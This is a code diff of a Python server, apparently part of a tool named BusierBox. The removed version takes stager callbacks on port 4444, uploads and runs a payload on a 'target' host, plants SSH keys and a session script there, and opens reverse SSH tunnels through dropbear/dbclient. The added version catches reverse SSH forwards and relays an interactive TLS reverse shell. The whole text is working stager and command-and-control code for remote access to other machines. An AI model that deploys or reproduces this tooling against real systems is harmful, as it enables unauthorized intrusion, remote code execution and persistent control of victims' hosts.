-                    print(f"  forward channel error: {exc}", file=sys.stderr)
-                    conn.close()
-            try:
-                fwd_sock.close()
-            except Exception:
-                pass
+                    threading.Thread(target=pipe, args=(local, chan), daemon=True).start()
+                    threading.Thread(target=pipe, args=(chan, local), daemon=True).start()
 
-        threading.Thread(target=_accept_loop, daemon=True, name="operator-fwd").start()
+        threading.Thread(target=run, daemon=True).start()
 
-    def wait(self, timeout=None):
-        """Block until the tunnel is established or timeout. Returns True on success."""
-        self.tunnel_event.wait(timeout=timeout)
-        return self._error is None and self._transport is not None and self._transport.is_active()
 
-    def is_active(self):
-        return self._transport is not None and self._transport.is_active()
-
-    def close(self):
-        try:
-            self._srv_sock.close()
-        except Exception:
-            pass
-        if self._transport:
-            self._transport.close()
-
-
-def _poll_reverse_tunnel(port, timeout=15):
-    """Poll localhost:port until reverse tunnel opens or timeout expires.
-    Returns True if port opened, False if timed out."""
-    deadline = time.time() + timeout
-    print(f"Waiting for reverse tunnel on localhost:{port}...", end="", flush=True)
-    while time.time() < deadline:
-        try:
-            with socket.create_connection(("127.0.0.1", port), timeout=1):
-                print(" open!")
-                return True
-        except OSError:
-            print(".", end="", flush=True)
-            time.sleep(1)
-    print(" timed out.")
-    return False
-
-
-# ── next steps ─────────────────────────────────────────────────────────────────
-
-def print_next_steps(addr, session_dir, remote_path, operator_port, args):
-    print("\nNext steps:")
-    print("  SSH/manual:")
-    print(f"    ssh root@{addr[0]}")
-    print(f"    {remote_path} zsh")
-    if operator_port:
-        auth_key = getattr(args, "operator_authorized_key_file", None)
-        key_hint = f"  # private key matching {auth_key}" if auth_key else ""
-        print(f"\n  Reverse SSH operator session:")
-        print(f"    ssh -p {operator_port} root@127.0.0.1{key_hint}")
-    parts = ["scripts/busierbox-server"]
-    if args.artifact:
-        parts.append(f"--artifact {args.artifact}")
-    if args.send:
-        parts.append("--send")
-    if args.exec_doctor:
-        parts.append("--exec-doctor")
-    if args.start_operator_session:
-        parts.append("--start-operator-session")
-    if args.once:
-        parts.append("--once")
-    print(f"\n  Re-run server:")
-    print(f"    {' '.join(parts)}")
-    print(f"\n  Inspect session:")
-    print(f"    less {session_dir}/summary.txt")
-    if operator_port:
-        print(f"    less {session_dir}/operator-session.txt")
-
-
-# ── session handler ────────────────────────────────────────────────────────────
-
-def handle_session(conn, addr, args):
-    conn.settimeout(args.timeout)
-    session_dir = make_session_dir()
-    with (session_dir / "session.jsonl").open("a", encoding="utf-8") as logfp:
-        try:
-            _session_inner(conn, addr, args, session_dir, logfp)
-        except (EOFError, ConnectionResetError, BrokenPipeError) as exc:
-            log_event(logfp, {"event": "error", "error": str(exc)})
-            print(f"Session ended: {exc}")
-        except Exception as exc:
-            tb = traceback.format_exc()
-            log_event(logfp, {"event": "error", "error": str(exc), "traceback": tb})
-            print(f"Session error: {exc}")
-        finally:
-            print(f"Session log:  {session_dir}/session.jsonl")
-
-
-def _session_inner(conn, addr, args, session_dir, logfp):  # noqa: C901
-    hello = recv_frame(conn)
-    log_event(logfp, {"event": "hello", "addr": list(addr), "hello": hello})
-    (session_dir / "hello.json").write_text(
-        json.dumps(hello, indent=2) + "\n", encoding="utf-8"
-    )
-
-    if hello.get("protocol") != PROTOCOL or hello.get("type") != "hello":
-        send_frame(conn, {"type": "close", "error": "bad protocol"})
-        raise RuntimeError("bad protocol")
-
-    if args.token and hello.get("token") != args.token:
-        print(f"Connection from {addr[0]} rejected: wrong token")
-        log_event(logfp, {"event": "reject", "reason": "token mismatch"})
-        send_frame(conn, {"type": "close", "error": "token mismatch"})
-        return
-
-    print("Token OK")
-
-    survey = hello.get("survey") or {}
-    (session_dir / "survey.json").write_text(
-        json.dumps(survey, indent=2) + "\n", encoding="utf-8"
-    )
-    print(f"Survey saved: {session_dir}/survey.json")
-
-    summarize_survey(addr, hello)
-
-    (session_dir / "summary.txt").write_text(
-        build_summary_text(addr, hello), encoding="utf-8"
-    )
-
-    config_content = build_recommended_config(hello)
-    (session_dir / "recommended.conf").write_text(config_content, encoding="utf-8")
-    if args.write_recommended_config:
-        Path(args.write_recommended_config).write_text(config_content, encoding="utf-8")
-        print(f"Recommended config: {args.write_recommended_config}")
-
-    # Survey-only mode: no artifact configured
-    if not args.artifact:
-        print("No --artifact configured; running survey-only mode.")
-        send_frame(conn, {"type": "close"})
-        log_event(logfp, {"event": "close"})
-        return
-
-    # Explicit survey-only flag
-    if args.survey_only:
-        print("Survey-only mode (--survey-only).")
-        send_frame(conn, {"type": "close"})
-        log_event(logfp, {"event": "close"})
-        return
-
-    # Determine whether to send artifact
-    do_send = args.send
-    if not do_send and not args.yes:
-        do_send = ask("Send full artifact?", False)
-
-    if not do_send:
-        send_frame(conn, {"type": "close"})
-        log_event(logfp, {"event": "close"})
-        return
-
-    # Send artifact
-    artifact = Path(args.artifact)
-    size = artifact.stat().st_size
-    digest = sha256_file(artifact)
-    print(f"Sending artifact {artifact} ({size} bytes)...")
-    send_frame(conn, {
-        "type": "send_file",
-        "path": args.remote_path,
-        "mode": 0o755,
-        "size": size,
-        "sha256": digest,
-    })
-    with artifact.open("rb") as fp:
-        for chunk in iter(lambda: fp.read(1024 * 1024), b""):
-            conn.sendall(chunk)
-    result = recv_frame(conn)
-    log_event(logfp, {"event": "send_file_result", "result": result})
-    print(result.get("message", "send_file result"))
-    if not result.get("ok"):
-        raise RuntimeError(
-            f"stager failed to write artifact: {result.get('message', result)}"
-        )
-    print(f"SHA256 {'OK' if result.get('sha256_ok') else 'not verified'}")
-
-    (session_dir / "artifact.json").write_text(
-        json.dumps({
-            "local_path": str(artifact.resolve()),
-            "size": size,
-            "sha256": digest,
-            "remote_path": args.remote_path,
-            "sha256_ok": result.get("sha256_ok", False),
-        }, indent=2) + "\n",
-        encoding="utf-8",
-    )
-
-    remote_path = args.remote_path
-    staged_tools = []
-
-    # Determine exec mode
-    requested_auto_exec = hello.get("auto_exec")
-    exec_survey = args.exec_survey or requested_auto_exec == "survey"
-    exec_doctor = args.exec_doctor or requested_auto_exec == "doctor"
-    exec_rshell = requested_auto_exec == "shell"
-    exec_custom = requested_auto_exec == "custom"
-    do_exec = exec_survey or exec_doctor or exec_rshell or exec_custom
-    if not do_exec and not args.yes:
-        do_exec = ask("Run doctor after upload?", False)
-        if do_exec:
-            exec_doctor = True
-
-    if do_exec:
-        # Force-extract before doctor/survey/rshell (default on unless disabled)
-        if not args.no_force_extract_before_doctor:
-            print("Running extract --force...")
-            send_frame(conn, {"type": "exec", "argv": [remote_path, "extract", "--force"]})
-            ex_result = recv_frame(conn)
-            log_event(logfp, {"event": "exec_result", "subcmd": "extract", "result": ex_result})
-            ex_stdout = ex_result.get("stdout") or ""
-            ex_exit = ex_result.get("exit_code", -1)
-            print(f"extract exit={ex_exit}")
-            if ex_stdout.strip():
-                print(ex_stdout[:2000])
-            (session_dir / "extract.txt").write_text(
-                f"exit={ex_exit}\n\n{ex_stdout}\n", encoding="utf-8"
-            )
-            if not ex_result.get("ok"):
-                if not args.force_doctor_after_extract_fail:
-                    print(f"Extract --force failed; skipping doctor.")
-                    print("  Use --force-doctor-after-extract-fail to override.")
-                    send_frame(conn, {"type": "close"})
-                    log_event(logfp, {"event": "close"})
-                    return
-                print("Extract --force failed; continuing to doctor (--force-doctor-after-extract-fail).")
-
-        # Run requested post-receive action
-        if exec_rshell:
-            subcmd = "rshell"
-        elif exec_custom:
-            subcmd = None
-        else:
-            subcmd = "survey" if exec_survey and not exec_doctor else "doctor"
-        print(f"Running {subcmd or 'zero-arg custom'}...")
-        send_frame(conn, {"type": "exec", "argv": [remote_path] if subcmd is None else [remote_path, subcmd]})
-        exec_result = recv_frame(conn)
-        log_event(logfp, {"event": "exec_result", "subcmd": subcmd or "zero-arg", "result": exec_result})
-        exec_exit = exec_result.get("exit_code", -1)
-        print(f"{subcmd or 'zero-arg'} exit={exec_exit}")
-        stdout = exec_result.get("stdout") or ""
-
-        if subcmd == "doctor" and stdout:
-            kv = parse_doctor_kv(stdout)
-            if len(kv) >= 3:
-                try:
-                    staged_tools = print_doctor_summary(kv)
-                except Exception as exc:
-                    print(f"(doctor summary error: {exc})")
-                    print(stdout[:4000])
-                    staged_tools = parse_list_field(kv.get("staged_tools", "[]"))
-            else:
-                # Not structured output (e.g. test stubs) — print raw
-                print(stdout[:4000])
-            (session_dir / "doctor.txt").write_text(stdout, encoding="utf-8")
-            with (session_dir / "summary.txt").open("a", encoding="utf-8") as f:
-                f.write(f"\ndoctor_exit={exec_exit}\n")
-                if staged_tools:
-                    f.write(f"staged_tools={','.join(staged_tools)}\n")
-        elif stdout:
-            print(stdout[:4000])
-
-        # Operator session
-        operator_port = _maybe_operator_session(
-            conn, addr, args, session_dir, logfp, remote_path, staged_tools
-        )
-    else:
-        operator_port = None
-
-    send_frame(conn, {"type": "close"})
-    log_event(logfp, {"event": "close"})
-
-    print_next_steps(addr, session_dir, remote_path, operator_port, args)
-
-
-def _maybe_operator_session(conn, addr, args, session_dir, logfp, remote_path, staged_tools):
-    """Stage keys, upload session script, start reverse SSH. Returns forward port or None."""
-    # Check staged tools first (gating condition for the prompt)
-    missing_tools = [t for t in ("dropbear", "dbclient") if t not in staged_tools]
-    if missing_tools:
-        if args.start_operator_session:
-            print("Operator session unavailable:")
-            for t in missing_tools:
-                print(f"  {t} not staged in payload")
-        return None
-
-    do_op = args.start_operator_session
-    if not do_op and not args.yes:
-        do_op = ask("Start reverse SSH operator session?", False)
-    if not do_op:
-        return None
-
-    # Validate auth prerequisites before touching the connection
-    auth_errors = _validate_operator_session_auth(args)
-    if auth_errors:
-        print("Operator session unavailable:")
-        for e in auth_errors:
-            print(f"  {e}")
-        return None
-
-    extract_dir = ".busierbox"
-    identity_dst = f"{extract_dir}/payload/home/.ssh/id_dbclient"
-    script_dst = "/tmp/bbx-operator-session.sh"
-    fwd_port = args.operator_remote_forward_port
-
-    # Stage dbclient identity key (target → server auth)
-    print("Staging dbclient identity key...")
-    identity_data = Path(args.operator_dbclient_identity_file).read_bytes()
-    id_result = send_bytes(conn, logfp, identity_data, identity_dst, 0o600, "identity_key")
-    if not id_result.get("ok"):
-        print(f"Failed to stage identity key: {id_result.get('message', id_result)}")
-        return None
-    print(f"  {identity_dst}")
-
-    # Generate, save, and upload operator session script
-    script_content = build_operator_session_script(args, extract_dir)
-    (session_dir / "operator-session-command.sh").write_text(
-        script_content, encoding="utf-8"
-    )
-    print("Uploading operator session script...")
-    sh_result = send_bytes(
-        conn, logfp, script_content.encode(), script_dst, 0o755, "operator_session_script"
-    )
-    if not sh_result.get("ok"):
-        print(f"Failed to upload session script: {sh_result.get('message', sh_result)}")
-        return None
-
-    # Start operator SSH server BEFORE executing script so dbclient has somewhere to connect
-    wait_timeout = getattr(args, "operator_wait_timeout", 600)
-    op_ssh_server = None
-    if _HAVE_PARAMIKO:
-        bind_port = args.operator_server_ssh_port
-        id_file = args.operator_dbclient_identity_file or "local/operator-session/id_dbclient"
-        pubkey_path = id_file + ".pub"
-        host_key_path = str(Path(id_file).parent / "operator_ssh_host_key")
-        if Path(pubkey_path).exists():
-            try:
-                print(f"Starting operator SSH server on 0.0.0.0:{bind_port}...")
-                op_ssh_server = OperatorSSHServer(
-                    bind_port=bind_port,
-                    host_key_path=host_key_path,
-                    pubkey_path=pubkey_path,
-                    forward_port=fwd_port,
-                )
-            except OSError as exc:
-                print(f"Warning: could not start operator SSH server on port {bind_port}: {exc}")
-        else:
-            print(f"Warning: operator pubkey not found at {pubkey_path}; falling back to poll")
-
-    # Execute the script (it launches dropbear+dbclient as background jobs then exits)
-    print("Starting operator session...")
-    send_frame(conn, {"type": "exec", "argv": ["/bin/sh", script_dst]})
-    op_result = recv_frame(conn)
-    log_event(logfp, {"event": "exec_result", "subcmd": "operator-session", "result": op_result})
-    op_stdout = op_result.get("stdout") or ""
-    op_exit = op_result.get("exit_code", -1)
-
-    (session_dir / "operator-session.txt").write_text(
-        f"exit={op_exit}\n"
-        f"script_path={script_dst}\n"
-        f"identity_path={identity_dst}\n\n"
-        f"output:\n{op_stdout}\n",
-        encoding="utf-8",
-    )
-
-    print("Operator session logs:")
-    print(f"  target: /tmp/dropbear-bbx.log")
-    print(f"  target: /tmp/dbclient-bbx.log")
-    print(f"  local:  {session_dir}/operator-session.txt")
-    print(f"  local:  {session_dir}/operator-session-command.sh")
-
-    if not (op_result.get("ok") or "operator-session-started" in op_stdout):
-        print(f"Operator session script failed (exit={op_exit}).")
-        if op_stdout.strip():
-            print(op_stdout[:500])
-        print("Troubleshoot:")
-        print("  /tmp/dropbear-bbx.log")
-        print("  /tmp/dbclient-bbx.log")
-        if op_ssh_server:
-            op_ssh_server.close()
-        return None
-
-    for line in op_stdout.strip().splitlines():
-        print(f"  {line}")
-
-    # Health check: wait for tunnel via paramiko server, or fall back to polling
-    do_hc = not getattr(args, "no_operator_healthcheck", False)
-    if do_hc:
-        if op_ssh_server:
-            tunnel_ok = op_ssh_server.wait(timeout=wait_timeout)
-            if not tunnel_ok:
-                print(f"Reverse tunnel did not open within {wait_timeout}s.")
-                print(f"  server error: {op_ssh_server._error or 'unknown'}")
-                print("Check target logs:")
-                print("  /tmp/dropbear-bbx.log")
-                print("  /tmp/dbclient-bbx.log")
-                op_ssh_server.close()
-                return None
-        else:
-            tunnel_ok = _poll_reverse_tunnel(fwd_port, timeout=wait_timeout)
-            if not tunnel_ok:
-                print(f"Reverse tunnel did not open within {wait_timeout}s.")
-                print("Check target logs:")
-                print("  /tmp/dropbear-bbx.log")
-                print("  /tmp/dbclient-bbx.log")
-                return None
-        print("Reverse SSH operator session ready.")
-    else:
-        print("Operator session started (healthcheck skipped).")
-
-    return fwd_port
-
-
-# ── main ───────────────────────────────────────────────────────────────────────
-
-def main():
-    pre = argparse.ArgumentParser(add_help=False)
-    pre.add_argument("--config", default=str(DEFAULT_CONFIG))
-    pre.add_argument("--no-config", action="store_true")
-    pre_args, _ = pre.parse_known_args()
-    config_defaults = {}
-    if not pre_args.no_config:
-        config_defaults = load_server_config(pre_args.config)
-
-    parser = argparse.ArgumentParser(description="BusierBox stager callback server")
-    parser.add_argument("--config", default=pre_args.config,
-                        help="server defaults JSON/key=value file (default: local/server-config.json)")
-    parser.add_argument("--no-config", action="store_true",
-                        help="ignore server defaults config")
-    parser.add_argument("--listen", default="0.0.0.0:4444", type=parse_listen)
-    parser.add_argument("--token", default="")
-    parser.add_argument("--artifact", help="full artifact to send to target")
-    parser.add_argument("--remote-path", default="/tmp/busierbox-full")
-    parser.add_argument("--send", action="store_true",
-                        help="send artifact (requires --artifact)")
-    parser.add_argument("--survey-only", action="store_true",
-                        help="accept callback and survey only; do not send artifact")
-    parser.add_argument("--exec-doctor", action="store_true")
-    parser.add_argument("--exec-survey", action="store_true")
-    parser.add_argument("--yes", action="store_true", help="answer yes to all prompts")
-    parser.add_argument("--once", action="store_true",
-                        help="exit after one session")
-    parser.add_argument("--timeout", type=int, default=1200)
-    parser.add_argument("--write-recommended-config",
-                        help="also write recommended config to this path")
-
-    parser.add_argument("--no-force-extract-before-doctor", action="store_true",
-                        help="skip extract --force before running doctor")
-    parser.add_argument("--force-doctor-after-extract-fail", action="store_true",
-                        help="run doctor even if extract --force failed")
-
-    parser.add_argument("--start-operator-session", action="store_true",
-                        help="start reverse SSH operator session after upload")
-    parser.add_argument("--operator-server-host",
-                        help="operator workstation host for reverse SSH tunnel")
-    parser.add_argument("--operator-server-ssh-port", type=int, default=22202,
-                        metavar="PORT")
-    parser.add_argument("--operator-server-user", default="root", metavar="USER")
-    parser.add_argument("--operator-remote-forward-port", type=int, default=2200,
-                        metavar="PORT")
-    parser.add_argument("--operator-target-dropbear-port", type=int, default=2222,
-                        metavar="PORT")
-    parser.add_argument("--operator-target-bind-host", default="127.0.0.1",
-                        metavar="HOST")
-    # Auth: operator → target (public key embedded in session script)
-    parser.add_argument("--operator-authorized-key-file", metavar="PATH",
-                        help="public key staged to target authorized_keys (operator → target auth)")
-    # Auth: target → server (private key staged to payload/home/.ssh/id_dbclient)
-    parser.add_argument("--operator-dbclient-identity-file", metavar="PATH",
-                        help="private key for target dbclient → operator server auth")
-    # Known-hosts policy for dbclient
-    parser.add_argument("--operator-known-hosts-policy",
-                        choices=["off", "strict", "accept-new"], default="off",
-                        metavar="POLICY",
-                        help="dbclient known-hosts policy: off (default, -y), strict, accept-new")
-    # Healthcheck
-    parser.add_argument("--operator-wait-timeout", type=int, default=600,
-                        metavar="SEC",
-                        help="seconds to poll for reverse tunnel after session start (default: 15)")
-    parser.add_argument("--no-operator-healthcheck", action="store_true",
-                        help="skip reverse tunnel healthcheck after session start")
-    parser.add_argument("--rshell", "--wait-operator-tunnel", action="store_true",
-                        dest="wait_operator_tunnel",
-                        help="only wait for the configured reverse SSH tunnel and print the connect command")
-
-    if config_defaults:
-        parser.set_defaults(**config_defaults)
-
-    args = parser.parse_args()
-
-    # Startup validation
-    if args.wait_operator_tunnel:
-        if not _HAVE_PARAMIKO:
-            print("paramiko is required for the operator SSH server.", file=sys.stderr)
-            print("Install it with: pip install paramiko", file=sys.stderr)
-            return 1
-        bind_port = args.operator_server_ssh_port
-        forward_port = args.operator_remote_forward_port
-        id_file = args.operator_dbclient_identity_file or "local/operator-session/id_dbclient"
-        pubkey_path = id_file + ".pub"
-        host_key_path = str(Path(id_file).parent / "operator_ssh_host_key")
-        if not Path(pubkey_path).exists():
-            print(f"Operator pubkey not found: {pubkey_path}", file=sys.stderr)
-            print("Run 'menuconfig → Reverse shell → Prepare local ephemeral keys/defaults' first.", file=sys.stderr)
-            return 1
-        print(f"Starting operator SSH server on 0.0.0.0:{bind_port} ...", flush=True)
-        print(f"Waiting for target dbclient to connect (run 'busierbox rshell' on target)...", flush=True)
-        server = OperatorSSHServer(
-            bind_port=bind_port,
-            host_key_path=host_key_path,
-            pubkey_path=pubkey_path,
-            forward_port=forward_port,
-        )
-        ok = server.wait(timeout=args.operator_wait_timeout)
-        if not ok:
-            msg = server._error or "timed out"
-            print(f"Operator tunnel failed: {msg}", file=sys.stderr, flush=True)
-            server.close()
-            return 1
-        print(f"Reverse tunnel open. Connect with:", flush=True)
-        print(f"  ssh -p {forward_port} root@127.0.0.1", flush=True)
-        print("Press Ctrl+C to close.", flush=True)
-        try:
-            while server.is_active():
-                time.sleep(1)
-        except KeyboardInterrupt:
-            pass
-        server.close()
-        return 0
-
-    if args.send and not args.artifact:
-        parser.error("--send requires --artifact")
-    if args.artifact and not Path(args.artifact).is_file():
-        parser.error(f"artifact not found: {args.artifact}")
-    if args.start_operator_session and args.survey_only:
-        parser.error("--start-operator-session conflicts with --survey-only")
-
-    host, port = args.listen
-
-    if not args.artifact:
-        print("No --artifact configured; server will run in survey-only mode.")
-
-    print(f"Listening on {host}:{port}")
-    print("Candidate callback addresses:")
-    for ip in local_ips():
-        print(f"  {ip}:{port}")
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind((host, port))
-        srv.listen(5)
-        srv.settimeout(args.timeout)
+def pipe(src, dst):
+    try:
         while True:
-            try:
-                conn, addr = srv.accept()
-            except socket.timeout:
-                print("server timeout waiting for connection", file=sys.stderr)
-                return 1
-            with conn:
-                handle_session(conn, addr, args)
-            if args.once:
+            data = src.recv(65536)
+            if not data:
                 break
+            dst.sendall(data)
+    except OSError:
+        pass
+    finally:
+        try:
+            dst.shutdown(socket.SHUT_WR)
+        except OSError:
+            pass
+
+
+def serve_ssh(cfg, timeout):
+    if not HAVE_PARAMIKO:
+        print("Paramiko is required for SSH reverse-forward mode.", file=sys.stderr)
+        print("Install python3-paramiko or use --transport socat-tls.", file=sys.stderr)
+        return 2
+    host_key = ensure_host_key(cfg["operator_host_key"])
+    authorized = load_public_key(cfg["authorized_dbclient_pubkey"])
+    log_dir = session_log_dir(cfg, "ssh")
+    (log_dir / "config.json").write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((str(cfg["listen_host"]), int(cfg["ssh_listen_port"])))
+        sock.listen(20)
+        sock.settimeout(timeout)
+        print_candidates(cfg, cfg["ssh_listen_port"])
+        print(f"Authorized target key: {cfg['authorized_dbclient_pubkey']}")
+        try:
+            client, addr = sock.accept()
+        except socket.timeout:
+            print("timeout waiting for reverse SSH connection", file=sys.stderr)
+            return 1
+    print(f"Connection from {addr[0]}:{addr[1]}")
+
+    transport = paramiko.Transport(client)
+    transport.add_server_key(host_key)
+    # Dropbear sends X25519 key exchange data in a format that triggers a paramiko
+    # bug (ValueError: An X25519 public key is 32 bytes long).  Exclude curve25519
+    # from the offered kex algorithms so Dropbear falls back to ecdh-sha2-nistp256.
+    _sec = transport.get_security_options()
+    _sec.kex = tuple(k for k in _sec.kex if "curve25519" not in k.lower())
+    server = ReverseSSHServer(authorized, cfg["forward_host"], cfg["forward_port"])
+    server.set_transport(transport)
+    transport.start_server(server=server)
+    try:
+        while transport.is_active():
+            time.sleep(1.0)
+    finally:
+        transport.close()
     return 0
 
 
+def relay_stdio(conn):
+    print("TLS shell connected. Ctrl-C to close.")
+    conn.setblocking(False)
+    while True:
+        readable, _, _ = select.select([conn, sys.stdin], [], [])
+        if conn in readable:
+            try:
+                data = conn.recv(65536)
+            except OSError:
+                break
+            if not data:
+                break
+            os.write(sys.stdout.fileno(), data)
+        if sys.stdin in readable:
+            data = os.read(sys.stdin.fileno(), 65536)
+            if not data:
+                break
+            conn.sendall(data)
+
+
+def serve_socat_tls(cfg, timeout):
+    cert = Path(str(cfg["tls_cert"]))
+    key = Path(str(cfg["tls_key"]))
+    if not cert.is_file() or not key.is_file():
+        print(f"TLS cert/key missing: {cert} / {key}", file=sys.stderr)
+        return 2
+    log_dir = session_log_dir(cfg, "socat-tls")
+    (log_dir / "config.json").write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain(str(cert), str(key))
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((str(cfg["listen_host"]), int(cfg["socat_listen_port"])))
+        sock.listen(1)
+        sock.settimeout(timeout)
+        print_candidates(cfg, cfg["socat_listen_port"])
+        try:
+            raw, addr = sock.accept()
+        except socket.timeout:
+            print("timeout waiting for socat TLS shell", file=sys.stderr)
+            return 1
+    print(f"TLS connection from {addr[0]}:{addr[1]}")
+    with context.wrap_socket(raw, server_side=True) as conn:
+        relay_stdio(conn)
+    return 0
+
+
+def main(argv=None):
+    parser = argparse.ArgumentParser(
+        description="Catch BusierBox reverse-access transports from a target."
+    )
+    parser.add_argument("--config", default=str(DEFAULT_CONFIG),
+                        help="JSON config written by menuconfig")
+    parser.add_argument("--transport", choices=("ssh", "ssh-reverse", "socat-tls", "tls-shell"),
+                        help="transport to listen for")
+    parser.add_argument("--listen-host", help="listener bind address")
+    parser.add_argument("--ssh-port", type=int, help="SSH reverse-forward listener port")
+    parser.add_argument("--socat-port", type=int, help="socat TLS shell listener port")
+    parser.add_argument("--forward-port", type=int,
+                        help="remote forward port exposed on the operator workstation")
+    parser.add_argument("--timeout", type=float, default=0,
+                        help="seconds to wait for a connection; 0 waits forever")
+    args = parser.parse_args(argv)
+
+    cfg = load_config(args.config)
+    if args.transport:
+        cfg["transport"] = "ssh" if args.transport == "ssh-reverse" else (
+            "socat-tls" if args.transport == "tls-shell" else args.transport
+        )
+    if args.listen_host:
+        cfg["listen_host"] = args.listen_host
+    if args.ssh_port:
+        cfg["ssh_listen_port"] = args.ssh_port
+    if args.socat_port:
+        cfg["socat_listen_port"] = args.socat_port
+    if args.forward_port:
+        cfg["forward_port"] = args.forward_port
+
+    timeout = None if args.timeout == 0 else args.timeout
+    transport = cfg["transport"]
+    if transport == "ssh":
+        return serve_ssh(cfg, timeout)
+    if transport == "socat-tls":
+        return serve_socat_tls(cfg, timeout)
+    print(f"unsupported transport: {transport}", file=sys.stderr)
+    return 2
+
+
 if __name__ == "__main__":
-    try:
-        raise SystemExit(main())
-    except KeyboardInterrupt:
-        raise SystemExit(130)
+    raise SystemExit(main())
